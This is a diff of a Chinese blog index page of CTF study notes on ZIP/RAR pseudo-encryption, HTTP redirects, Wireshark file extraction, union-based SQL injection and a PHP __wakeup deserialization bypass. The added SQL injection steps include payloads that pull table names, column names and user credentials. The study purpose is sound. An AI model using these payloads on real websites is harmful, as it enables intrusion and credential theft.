@@ -71,6 +71,93 @@
       <div class="outer">
         <section id="main">
   
+    <article id="past-zip和rar文件的伪加密" class="h-entry article article-type-past" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/01/13/zip%E5%92%8Crar%E6%96%87%E4%BB%B6%E7%9A%84%E4%BC%AA%E5%8A%A0%E5%AF%86/" class="article-date">
+  <time class="dt-published" datetime="2023-01-13T13:36:39.000Z" itemprop="datePublished">2023-01-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/01/13/zip%E5%92%8Crar%E6%96%87%E4%BB%B6%E7%9A%84%E4%BC%AA%E5%8A%A0%E5%AF%86/">zip和rar文件的伪加密</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="zip文件的伪加密"><a href="#zip文件的伪加密" class="headerlink" title="zip文件的伪加密"></a>zip文件的伪加密</h2><p>一个 ZIP 文件由三个部分组成：<br>压缩源文件数据区 + 压缩源文件目录区(核心目录记录区) + 压缩源文件目录结束标志(目录记录尾部区)<br><strong>第7、8个字节处为全局方式位标记，作用是判断有无加密</strong><br>全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性，即：</p>
+<ul>
+<li>第二个数字为奇数时 –&gt;加密</li>
+<li>第二个数字为偶数时 –&gt;未加密</li>
+</ul>
+<h2 id="rar文件的伪加密"><a href="#rar文件的伪加密" class="headerlink" title="rar文件的伪加密"></a>rar文件的伪加密</h2><p>rar文件由于有头部校验，使用伪加密时打开文件会出现报错，使用winhex或010editor修改标志位后如报错消失且正常解压缩，说明是伪加密。使用winhex或010editor打开RAR文件，找到<strong>第24个字节</strong>，该字节<strong>尾数为4表示加密，0表示无加密，将尾数改为0即可解除伪加密</strong></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/01/13/zip%E5%92%8Crar%E6%96%87%E4%BB%B6%E7%9A%84%E4%BC%AA%E5%8A%A0%E5%AF%86/" data-id="clculhymx0006t8ai2nw3cbxv" data-title="zip和rar文件的伪加密" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="past-http重定向" class="h-entry article article-type-past" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/01/13/http%E9%87%8D%E5%AE%9A%E5%90%91/" class="article-date">
+  <time class="dt-published" datetime="2023-01-13T11:50:51.000Z" itemprop="datePublished">2023-01-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/01/13/http%E9%87%8D%E5%AE%9A%E5%90%91/">http重定向</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h3 id="什么是http重定向"><a href="#什么是http重定向" class="headerlink" title="什么是http重定向"></a>什么是http重定向</h3><p>HTTP中的重定向就是当客户端访问一个服务器不可用的资源后，服务器会返回一个响应包，响应包中带有另一个链接，然后浏览器会自动跳转到另一个链接，无需用户点击，是浏览器自动跳转的。</p>
+<h3 id="重定向原理"><a href="#重定向原理" class="headerlink" title="重定向原理"></a>重定向原理</h3><p>客户端访问了一个不可用的资源，然后服务器返回了一个响应包。<br><strong>响应包有以下特点：</strong><br>1、 status code &#x3D; 3xx，表示这是一个重定向包<br>2、 响应头中有一个location属性，对应的值为需要跳转到的新链接。<br>3、 浏览器自动发起一个http请求访问新链接<br>4、 服务器返回新链接响应的数据，在浏览器中展示</p>
+<h3 id="永久重定向和临时重定向"><a href="#永久重定向和临时重定向" class="headerlink" title="永久重定向和临时重定向"></a>永久重定向和临时重定向</h3><p>status code &#x3D; 301： 永久重定向，搜索引擎或者浏览器会自动将书签、历史记录、搜索引擎对应的记录中旧链接更新为新链接。下次就访问新链接。<br>status code &#x3D; 302： 临时重定向，原来的URL仍然有效，下次还访问旧链接。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40276626/article/details/120383434">https://blog.csdn.net/qq_40276626/article/details/120383434</a></p>
+<h2 id="ctf-302跳转"><a href="#ctf-302跳转" class="headerlink" title="ctf 302跳转"></a>ctf 302跳转</h2><p>进入题目页面，发现<code>Give me Flag</code>，点击，发现页面未跳转，结合题意，可知发生了302临时跳转，所以我们<code>无法通过浏览器直接访问未跳转的页面</code>，而flag 可能藏在我们目前无法访问的页面之中。所以我们要想办法去<code>访问未跳转的原网站</code>。<br>方法：抓包，右键–&gt;Send to Repeater–&gt;Repeater模块–&gt;Send–&gt;Response部分出现flag </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/01/13/http%E9%87%8D%E5%AE%9A%E5%90%91/" data-id="clculhymu0001t8ai8atv9dc9" data-title="http重定向" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="past-一句话木马和Webshell" class="h-entry article article-type-past" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2023/01/07/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%92%8CWebshell/" class="article-date">
@@ -109,7 +196,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/01/07/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%92%8CWebshell/" data-id="clcqfayph0007l4aibs2l30bl" data-title="一句话木马和Webshell" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2023/01/07/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%92%8CWebshell/" data-id="clculhymy0008t8aife5phxcn" data-title="一句话木马和Webshell" class="article-share-link">Share</a>
       
       
       
@@ -156,7 +243,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/01/03/%E6%90%9C%E9%9B%86%E4%BA%86sqlmap%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4/" data-id="clcqfaypj000dl4ai9iuabip9" data-title="搜集了sqlmap的一些指令" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2023/01/03/%E6%90%9C%E9%9B%86%E4%BA%86sqlmap%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4/" data-id="clculhymz0009t8aibymu8qrc" data-title="搜集了sqlmap的一些指令" class="article-share-link">Share</a>
       
       
       
@@ -207,11 +294,9 @@
 <li><code>select user();</code>查看当前登录数据库的用户</li>
 <li><code>select @@datadir;</code>查看数据路径</li>
 <li><code>select @@basedir;</code>查看mysql安装路径</li>
-<li><code>select @@version_compile_os;</code>查看mysql安装的系统</li>
+<li><code>select @@version_compile_os;</code>查看mysql安装的系统<br><strong>重点来啦！</strong></li>
 </ol>
 </li>
-</ol>
-<h5 id="重点来啦！"><a href="#重点来啦！" class="headerlink" title="重点来啦！"></a>重点来啦！</h5><ol start="5">
 <li>select关键字查询数据重点用法<br><code>select * from 数据库名.表名；</code> 查询数据（<code>*</code>表示所有字段）<br>  查具体字段就把<code>*</code>换成具体字段名，如select id,host from mysql.user;查询id和host字段)</li>
 <li>union联合查询<br>例：<br><code>select * from test.t1 union select 1,2,3,4,5;</code><br><code>select user,host from mysql.user union select * from test.t1;</code></li>
 <li>where条件<br>where相当于编程语言中的if<br>例：select user,host from mysql.user where user&#x3D;’root’;</li>
@@ -222,7 +307,7 @@
 <li>插入数据<br><code>insert into t1 values (1,&quot;张三&quot;),(2,&quot;李四&quot;),(3,&quot;王五&quot;)</code></li>
 </ol>
 <h2 id="判断是否存在SQL注入漏洞"><a href="#判断是否存在SQL注入漏洞" class="headerlink" title="判断是否存在SQL注入漏洞"></a>判断是否存在SQL注入漏洞</h2><p>对于一个陌生网站，判断其是否存在SQL注入漏洞：<br>输入框内输入一个英文单引号’并上传，然后F12，进入Network网络部分查看Response<br>若提示SQL语法存在错误，则该网站大概率存在SQL注入漏洞。</p>
-<h2 id="GET型SQL注入漏洞是什么"><a href="#GET型SQL注入漏洞是什么" class="headerlink" title="GET型SQL注入漏洞是什么"></a>GET型SQL注入漏洞是什么</h2><p>我们在提交网页内容的时候，主要分为GET方法，POST方法，GET方法提交的内容会显示在网页的URL上，<br>通过对URL连接进行构造，可以获得超出权限的信息内容。</p>
+<h2 id="GET型SQL注入漏洞"><a href="#GET型SQL注入漏洞" class="headerlink" title="GET型SQL注入漏洞"></a>GET型SQL注入漏洞</h2><p>我们在提交网页内容的时候，主要分为GET方法，POST方法，GET方法提交的内容会显示在网页的URL上，<br>通过对URL连接进行构造，可以获得超出权限的信息内容。</p>
 <p>注入内容：<br><code>&#39; or 1=1#</code><br>或<code>&#39; or 1=1 -- </code><br>(此处英文单引号的作用是使条件闭合，在语法上形成完整的SQL语句，而<code>#</code>或<code>-- </code>的作用是注释掉后面的多余内容)</p>
 <ul>
 <li>检索隐藏数据</li>
@@ -240,15 +325,16 @@
 <li>拿到数据库database<br>database()返回当前连接的数据库是哪个</li>
 <li>拿到表table</li>
 <li>拿到表里的字段</li>
-<li>分析是否包含形如username，password等的字段<br>注：联合注入需要知道union前面的表包含几个字段，union后面字段数应与前面一致<br><strong>爆字段数的步骤：</strong><br>执行<code>select * from products union select 1;</code><br>若报错则说明前后字段数不一致<br>改为<code>select * from products union select 1，2;</code><br>再报错再改成<code>select 1,2,3;</code><br>直到有回显为止！<br>知道了表的字段数，接下来把union后面的1，2，3等改为一些需要的函数，如user(),database()等<br>例：<code>select * from products union select 1,user(),3,version(),database();</code><br><strong>注意：改的时候注意对应字段的数据类型！要与函数的返回类型对应！</strong></li>
+<li>分析是否包含形如username，password等的字段<br>注：联合注入需要知道union前面的表包含几个字段，union后面字段数应与前面一致<br><strong>爆字段数的步骤：</strong><br>执行<code>select * from products union select 1;</code><br>若报错则说明前后字段数不一致<br>改为<code>select * from products union select 1，2;</code><br>再报错再改成<code>select 1,2,3;</code><br>直到有回显为止！<br>知道了表的字段数！<br>接下来把union后面的1，2，3等改为一些需要的函数，如user(),database()等<br>例：<code>select * from products union select 1,user(),3,version(),database();</code><br><strong>注意：</strong><br><strong>1.改的时候注意对应字段的数据类型！要与函数的返回类型对应！</strong><br><strong>2.根据语句语法在最后加#注释多余内容防止报错！</strong><br>(格式如：输入框里输gifts’ union select 1,2,3,4#)</li>
 </ol>
 </li>
 </ol>
-
+<p>在输入框里输入<code>gifts&#39; union select 1,database(),3,4#</code>即可拿到数据库名。<br>拿到数据库名后，接下来拿表名：<br>在输入框里输入<code>1&#39; union select 1,database(),table_name,4 from information_schema.tables where table_schema=database()#</code>得到表名。<br>接下来分析表字段(假设有一张表，名为user)：<br>输入<code>1&#39; union select 1,database(),column_name,4 from information_schema.columns where table_name=&#39;user&#39; and table_schema=database()#</code><br>指出当前数据库中的名为user的表中的字段名<br>假设有字段名为username和password<br>则输入<code>1&#39;union select 1,username,password,4 from user #</code><br>可以拿到用户名和密码！！！</p>
+<h2 id="POST型SQL注入漏洞"><a href="#POST型SQL注入漏洞" class="headerlink" title="POST型SQL注入漏洞"></a>POST型SQL注入漏洞</h2>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/01/02/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" data-id="clcqfaypd0001l4aid4tpa9f8" data-title="SQL注入笔记" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2023/01/02/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" data-id="clculhymq0000t8ai5iqbhjcp" data-title="SQL注入笔记" class="article-share-link">Share</a>
       
       
       
@@ -291,7 +377,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/01/02/%E4%B8%80%E4%BA%9Blinux%E5%91%BD%E4%BB%A4/" data-id="clcqfaypi0009l4ai7yazdrbe" data-title="一些linux命令" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2023/01/02/%E4%B8%80%E4%BA%9Blinux%E5%91%BD%E4%BB%A4/" data-id="clculhymz000at8aihz4d9tmf" data-title="一些linux命令" class="article-share-link">Share</a>
       
       
       
@@ -337,7 +423,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/01/02/%E6%9F%A5%E7%9C%8B%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%92%8C%E6%96%87%E4%BB%B6%E5%88%86%E7%A6%BB/" data-id="clcqfaypi000al4ai13zkbcob" data-title="查看隐藏文件和文件分离" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2023/01/02/%E6%9F%A5%E7%9C%8B%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%92%8C%E6%96%87%E4%BB%B6%E5%88%86%E7%A6%BB/" data-id="clculhyn3000ft8ai2y96dl0d" data-title="查看隐藏文件和文件分离" class="article-share-link">Share</a>
       
       
       
@@ -395,11 +481,16 @@
 <li>第五行：TCP或UDP是传输的DATA，DNS这是域名的相关信息</li>
 </ul>
 <p>仅以自己的方式粗略总结，具体描述参见：1.<a target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/116800657">https://blog.csdn.net/LYJ20010728/article/details/116800657</a><br>2.<a target="_blank" rel="noopener" href="https://www.cnblogs.com/loopkep/p/13167281.html">https://www.cnblogs.com/loopkep/p/13167281.html</a></p>
+<h3 id="提取流量包中的文件"><a href="#提取流量包中的文件" class="headerlink" title="提取流量包中的文件"></a>提取流量包中的文件</h3><ol>
+<li>追踪http流，选中要提取文件的流，<br><strong>wireshark左上角:文件–&gt;导出分组字节流；</strong><br>可导出bin文件,改一下文件后缀也许就可以了……</li>
+<li>找到upload所在包，在MIME Multipart Media Encapsulation右键，显示分组字节<br>设置“显示为原始数据”、选择开始位置后，另存为1.rar即可</li>
+</ol>
+<p>  （参考：hgame “Where am I”题解）<br>  链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/orangewangSDU/article/details/128679462?csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22128679462%22,%22source%22:%22orangewangSDU%22%7D">https://blog.csdn.net/orangewangSDU/article/details/128679462?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22128679462%22%2C%22source%22%3A%22orangewangSDU%22%7D</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/12/30/wireshark%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" data-id="clcqfaypg0005l4ai1sx73rm6" data-title="wireshark流量分析" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/12/30/wireshark%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" data-id="clculhymx0005t8aig3vo5o30" data-title="wireshark流量分析" class="article-share-link">Share</a>
       
       
       
@@ -442,7 +533,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/12/29/png%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%8F%8A%E5%9B%BE%E7%89%87CRC%E7%9B%B8%E5%85%B3/" data-id="clcqfaypf0003l4ai4l3e9079" data-title="png文件结构及图片CRC相关" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/12/29/png%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%8F%8A%E5%9B%BE%E7%89%87CRC%E7%9B%B8%E5%85%B3/" data-id="clculhyn0000bt8ai5en97bnf" data-title="png文件结构及图片CRC相关" class="article-share-link">Share</a>
       
       
       
@@ -488,98 +579,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/12/27/%E4%B8%80%E4%BA%9Bphp%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" data-id="clcqfaypj000bl4aid4qi0eby" data-title="一些php魔术方法（unserialize3题解附）" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="past-攻防世界unserialize3题解及一些知识点" class="h-entry article article-type-past" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/12/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cunserialize3%E9%A2%98%E8%A7%A3%E5%8F%8A%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/" class="article-date">
-  <time class="dt-published" datetime="2022-12-27T09:28:15.000Z" itemprop="datePublished">2022-12-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/12/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cunserialize3%E9%A2%98%E8%A7%A3%E5%8F%8A%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/">攻防世界unserialize3题解及一些知识点</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>由题干unserialize:得知与反序列化有关！<br>上来给了一串php代码：<br>    <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;                     <span class="comment">//定义一个名为xctf的类</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;           <span class="comment">//定义一个公有的类属性$flag，值为111</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;     <span class="comment">//定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本</span></span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure><br>（推测这个?code&#x3D;应该是让我们以get方式提交code的值）<br>注意发现到有个wakeup()函数，我们要想办法绕过这个函数。</p>
-<p>wakeup()有个执行漏洞:一个字符串或对象被序列化后，如果其属性被修改，则不会执行wakeup()函数，这也算是一个绕过点</p>
-<p>代码中的__wakeup()方法如果使用就是和unserialize()反序列化函数结合使用的，这里没有序列化字符串，何来反序列化呢？于是，我们这里实例化xctf类并对其使用序列化（这里就实例化xctf类为对象a）<br>   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;                       <span class="comment">//定义一个名为xctf的类</span></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;             <span class="comment">//定义一个公有的类属性$flag，值为111</span></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;       <span class="comment">//定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本</span></span><br><span class="line"> <span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">xctf</span>();           <span class="comment">//使用new运算符来实例化该类（xctf）的对象为a</span></span><br><span class="line"> <span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));       <span class="comment">//输出被序列化的对象（a）</span></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>代码执行结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br><span class="line">/*xctf类后面有一个1,整个1表示的是xctf类中只有1个属性</span><br><span class="line">__wakeup()漏洞就是与序列化字符串的整个属性个数有关。当序列化字符串所表示的对象，</span><br><span class="line">其序列化字符串中属性个数大于真实属性个数时就会跳过__wakeup的执行，从而造成__wakeup()漏洞</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
-<p>因此，我们要反序列化xctf类的同时还要绕过__wakeup方法的执行（如果不绕过__wakeup()方法，那么将会输出bad requests并退出脚本）。<br>__wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值<code>大于</code>真实个数的属性时就会跳过__wakeup的执行。因此，需要<code>修改序列化字符串中的属性个数</code>：<br>当我们将上述的序列化的字符串中的对象属性个数由真实值1修改为3，即如下所示<br><code>O:4:&quot;xctf&quot;:3:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code><br>最后进行url的访问：<br><code>http://111.198.29.45:30940?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code><br>即可得到flag!!!</p>
-<p>下附序列化字符串各部分简单释义：<br>O代表结构类型为：类:4表示类名长度:接着是类名:属性（成员）个数<br>大括号内分别是：属性名类型;长度:名称:值类型:长度:值</p>
-<p>（大量照搬有种负罪感，但是自我的消化与理解必然是个漫长的过程，继续学习，深入理解，加油！）</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/12/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cunserialize3%E9%A2%98%E8%A7%A3%E5%8F%8A%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/" data-id="clcqfayph0008l4ai5gw4edh6" data-title="攻防世界unserialize3题解及一些知识点" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="past-XFF和Referer" class="h-entry article article-type-past" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/12/23/XFF%E5%92%8CReferer/" class="article-date">
-  <time class="dt-published" datetime="2022-12-23T10:30:38.000Z" itemprop="datePublished">2022-12-23</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/12/23/XFF%E5%92%8CReferer/">XFF和Referer</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>关于xff和referer：</p>
-<p>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。</p>
-<p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。简单地说，xff是告诉服务器当前请求者的最终ip的http请求头字段通常可以直接通过修改http头中的X-Forwarded-For字段来仿造请求的最终ip</p>
-<p>+++++++++++++++++++++++++++++++++++++++++++++++++++<br>也就是说：</p>
-<p>xff 是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP，以及代理服务器的IP。</p>
-<p>格式为：X-Forwarded-For: 本机IP, 代理1IP, 代理2IP, 代理2IP</p>
-<p>referer 是http的拓展头部，作用是记录当前请求页面的来源页面的地址。服务器使用referer确认访问来源，如果referer内容不符合要求，服务器可以拦截或者重定向请求。<br>+++++++++++++++++++++++++++++++++++++++++++++++++++<br>即：XFF构造来源IP，Referer构造来源浏览器！</p>
-<p>提取的解题方法：<br>用抓包软件burpsuit进行抓包，<br>在包里直接添加<br>X-Forwarded-For:IP名<br>Referer:地址<br>（同时在包里）<br>发送即可！</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/12/23/XFF%E5%92%8CReferer/" data-id="clcqfaypg0004l4aiedeh8uff" data-title="XFF和Referer" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/12/27/%E4%B8%80%E4%BA%9Bphp%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" data-id="clculhyn1000et8ai4hn401zr" data-title="一些php魔术方法（unserialize3题解附）" class="article-share-link">Share</a>
       
       
       
@@ -627,6 +627,14 @@
       <ul>
         
           <li>
+            <a href="/2023/01/13/zip%E5%92%8Crar%E6%96%87%E4%BB%B6%E7%9A%84%E4%BC%AA%E5%8A%A0%E5%AF%86/">zip和rar文件的伪加密</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/13/http%E9%87%8D%E5%AE%9A%E5%90%91/">http重定向</a>
+          </li>
+        
+          <li>
             <a href="/2023/01/07/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%92%8CWebshell/">一句话木马和Webshell</a>
           </li>
         
@@ -636,14 +644,6 @@
         
           <li>
             <a href="/2023/01/02/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/">SQL注入笔记</a>
-          </li>
-        
-          <li>
-            <a href="/2023/01/02/%E4%B8%80%E4%BA%9Blinux%E5%91%BD%E4%BB%A4/">一些linux命令</a>
-          </li>
-        
-          <li>
-            <a href="/2023/01/02/%E6%9F%A5%E7%9C%8B%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%92%8C%E6%96%87%E4%BB%B6%E5%88%86%E7%A6%BB/">查看隐藏文件和文件分离</a>
           </li>
         
       </ul>
